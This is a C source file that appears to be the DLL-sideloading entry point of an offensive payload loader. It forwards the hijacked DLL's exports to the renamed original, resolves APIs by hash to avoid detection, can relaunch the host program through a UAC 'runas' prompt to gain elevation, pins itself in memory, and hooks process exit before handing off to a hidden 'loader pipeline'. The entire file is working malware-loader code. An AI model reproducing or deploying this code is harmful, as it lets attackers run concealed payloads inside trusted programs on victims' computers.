// =============================================
// Sideload.c - DLL Sideloading Entry Point
//
// Provides DllMain for the DLL sideload build variant.
// On DLL_PROCESS_ATTACH, queues the loader pipeline
// to a thread pool thread via TpAllocWork/TpPostWork
// (avoids Loader Lock).
//
// When REQUIRE_ELEVATION is defined (build.bat sideload uac),
// the worker thread checks elevation first:
//   - Not admin: ShellExecuteA "runas" to relaunch host
//     EXE elevated, then terminate self.
//   - Admin (or relaunch failed): pin DLL, run Main().
// Without REQUIRE_ELEVATION, pins the DLL and runs Main()
// directly at whatever integrity level the host has.
//
// Export forwarding pragmas in Sideload.h proxy all
// original DLL exports to the renamed real DLL.
// The PE loader handles forwarding natively — no
// proxy code runs for legitimate API calls.
//
// Build: build.bat sideload [output_name.dll] [uac]
// Pre-req: python SideloadGen.py <target.dll>
// =============================================

#ifdef BUILD_DLL

#include "Common.h"
#include "Sideload.h"

// Main() from main.c — full loader pipeline
extern int Main(VOID);

// Globals set by DllMain, used by worker thread
static PVOID     g_pNtdll = NULL;
static HINSTANCE g_hDll   = NULL;

#ifdef REQUIRE_ELEVATION

// -----------------------------------------------
// Check if current process is running elevated
// Uses ntdll-only APIs (no advapi32 dependency)
// -----------------------------------------------
static BOOL IsElevated(VOID) {
    typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(HANDLE, ACCESS_MASK, PHANDLE);
    typedef NTSTATUS(NTAPI* fnNtQueryInformationToken)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS(NTAPI* fnNtClose2)(HANDLE);

    fnNtOpenProcessToken pNtOpenProcessToken =
        (fnNtOpenProcessToken)FetchExportAddress(g_pNtdll, NtOpenProcessToken_JOAAT);
    fnNtQueryInformationToken pNtQueryInfoToken =
        (fnNtQueryInformationToken)FetchExportAddress(g_pNtdll, NtQueryInformationToken_JOAAT);
    fnNtClose2 pNtClose =
        (fnNtClose2)FetchExportAddress(g_pNtdll, NtClose_JOAAT);

    if (!pNtOpenProcessToken || !pNtQueryInfoToken || !pNtClose)
        return FALSE;

    HANDLE hToken = NULL;
    NTSTATUS status = pNtOpenProcessToken((HANDLE)-1, 0x0008 /* TOKEN_QUERY */, &hToken);
    if (!NT_SUCCESS(status) || !hToken)
        return FALSE;

    TOKEN_ELEVATION te;
    MemSet(&te, 0, sizeof(te));
    ULONG dwLen = 0;
    status = pNtQueryInfoToken(hToken, TokenElevation, &te, sizeof(te), &dwLen);
    pNtClose(hToken);

    return (NT_SUCCESS(status) && te.TokenIsElevated);
}

// -----------------------------------------------
// Relaunch host EXE with "runas" for elevation
// Returns TRUE if elevated instance was launched
// -----------------------------------------------
static BOOL RelaunchElevated(VOID) {
    // Find kernel32 for LoadLibraryA + GetModuleFileNameA
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32)
        return FALSE;

    fnLoadLibraryA pLoadLibraryA =
        (fnLoadLibraryA)FetchExportAddress(pKernel32, LoadLibraryA_JOAAT);
    if (!pLoadLibraryA)
        return FALSE;

    // Get host EXE path
    typedef DWORD(WINAPI* fnGetModuleFileNameA2)(HMODULE, LPSTR, DWORD);
    fnGetModuleFileNameA2 pGetModuleFileNameA =
        (fnGetModuleFileNameA2)FetchExportAddress(pKernel32, GetModuleFileNameA_JOAAT);
    if (!pGetModuleFileNameA)
        return FALSE;

    CHAR szPath[260] = { 0 };
    DWORD dwLen = pGetModuleFileNameA(NULL, szPath, 260);
    if (dwLen == 0 || dwLen >= 260)
        return FALSE;

    // Load shell32 and resolve ShellExecuteA
    HMODULE hShell32 = pLoadLibraryA("shell32.dll");
    if (!hShell32)
        return FALSE;

    fnGetProcAddress pGetProcAddress =
        (fnGetProcAddress)FetchExportAddress(pKernel32, GetProcAddress_JOAAT);
    if (!pGetProcAddress)
        return FALSE;

    typedef HINSTANCE(WINAPI* fnShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
    fnShellExecuteA pShellExecuteA =
        (fnShellExecuteA)pGetProcAddress(hShell32, "ShellExecuteA");
    if (!pShellExecuteA)
        return FALSE;

    // Extract directory from EXE path (for working directory)
    CHAR szDir[260] = { 0 };
    MemCopy(szDir, szPath, dwLen);
    INT iLast = -1;
    for (INT i = 0; i < (INT)dwLen; i++) {
        if (szDir[i] == '\\') iLast = i;
    }
    if (iLast >= 0) szDir[iLast] = '\0';

    // "runas" triggers UAC prompt, szDir ensures correct working directory
    HINSTANCE hResult = pShellExecuteA(NULL, "runas", szPath, NULL, szDir, 5 /* SW_SHOW */);
    return ((INT_PTR)hResult > 32);
}

#endif /* REQUIRE_ELEVATION */

// -----------------------------------------------
// Thread pool callback
//
// 1. [REQUIRE_ELEVATION] Check elevation → relaunch if needed
// 2. Pin DLL in memory
// 3. Run Main() (full loader pipeline)
// -----------------------------------------------
static VOID NTAPI SideloadWorker(PVOID Instance, PVOID Context, PVOID Work) {
    (void)Instance;
    (void)Context;
    (void)Work;

#ifdef REQUIRE_ELEVATION
    // --- Elevation check ---
    if (!IsElevated()) {
        if (RelaunchElevated()) {
            // Elevated instance launched — terminate this one.
            // NtTerminateProcess not patched yet, safe to call directly.
            typedef NTSTATUS(NTAPI* fnNtTerminateProcess2)(HANDLE, NTSTATUS);
            fnNtTerminateProcess2 pNtTerminateProcess =
                (fnNtTerminateProcess2)FetchExportAddress(g_pNtdll, NtTerminateProcess_JOAAT);
            if (pNtTerminateProcess)
                pNtTerminateProcess((HANDLE)-1, 0);
            return;
        }
        // User clicked No on UAC — continue at medium integrity
    }
#endif

    // --- Pin our DLL in memory (LdrAddRefDll) ---
    typedef NTSTATUS(NTAPI* fnLdrAddRefDll)(ULONG Flags, PVOID BaseAddress);
    fnLdrAddRefDll pLdrAddRefDll = (fnLdrAddRefDll)FetchExportAddress(g_pNtdll, LdrAddRefDll_JOAAT);
    if (pLdrAddRefDll)
        pLdrAddRefDll(0x01, (PVOID)g_hDll);  // LDR_ADDREF_DLL_PIN

    // --- Run loader pipeline ---
    Main();
}

// -----------------------------------------------
// DllMain - DLL entry point for sideloading
//
// Minimal: find ntdll, queue worker, return.
// All heavy work (elevation, hooking, loader)
// happens on the thread pool thread.
// -----------------------------------------------
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    (void)lpReserved;

    if (dwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    // --- Find ntdll base via PEB (case-insensitive) ---
    g_pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!g_pNtdll)
        return TRUE;

    g_hDll = hDll;

    // --- Patch RtlExitUserProcess EARLY (before host can exit) ---
    // Must be in DllMain so it's active before the host EXE's main()
    // runs and potentially calls ExitProcess. The worker thread
    // might not fire in time for fast-exiting host processes.
    // NtTerminateProcess is NOT patched, so the non-elevated instance
    // can still self-terminate after relaunching elevated.
    InstallExitHook(g_pNtdll);

    // --- Queue worker to thread pool ---
    fnTpAllocWork pTpAllocWork = (fnTpAllocWork)FetchExportAddress(g_pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork  pTpPostWork  = (fnTpPostWork)FetchExportAddress(g_pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return TRUE;

    PVOID pWork = NULL;
    NTSTATUS status = pTpAllocWork(&pWork, (PVOID)SideloadWorker, NULL, NULL);
    if (NT_SUCCESS(status) && pWork)
        pTpPostWork(pWork);

    return TRUE;
}

#endif /* BUILD_DLL */
